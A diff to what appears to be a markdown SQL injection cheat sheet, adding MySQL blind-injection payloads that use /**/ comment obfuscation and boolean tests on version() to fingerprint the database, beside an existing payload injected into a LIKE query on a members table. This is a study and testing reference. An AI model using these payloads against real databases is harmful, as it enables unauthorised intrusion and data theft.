@@ -38,3 +38,14 @@ False:
 > AAAA')/**/or/**/(select/**/1)=0%23
 
 > select count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/OR/**/ (select/**/1)=0#
+
+### Boolean based MySQL queries for use in blind injections
+
+Establish the verison:
+
+Is the version 4.xxxxx?
+> select/**/(substring((select/**/version()),1,1))=4;
+
+Or 5.xxxx?
+> select/**/(substring((select/**/version()),1,1))=5;
+
